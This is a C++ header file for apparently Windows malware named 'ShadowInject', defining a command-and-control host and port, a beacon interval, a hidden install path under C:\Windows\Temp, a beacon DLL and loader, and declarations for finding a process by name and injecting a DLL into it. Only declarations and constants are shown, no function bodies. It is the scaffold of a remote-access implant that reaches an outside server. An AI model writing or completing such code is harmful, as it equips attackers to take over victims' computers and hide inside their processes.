#pragma once

#include <windows.h>
#include <string>
#include <fstream>
#include <ctime>
#include <tlhelp32.h>

#define C2_SERVER L"2d5f8eb0b18e42.lhr.life"
#define C2_PORT 80
#define BEACON_INTERVAL 10
#define INSTALL_PATH "C:\\Windows\\Temp\\ShadowInject\\"
#define DLL_NAME "beacon.dll"
#define LOADER_NAME "loader.exe"
#define LOG_FILE INSTALL_PATH "log.txt"

void Log(const char *msg);
std::string GetDllPath();
std::string GetLoaderPath();
bool FileExists(const std::string &path);
DWORD GetPidByName(const wchar_t *name);
bool InjectDll(DWORD pid, const std::string &dllPath);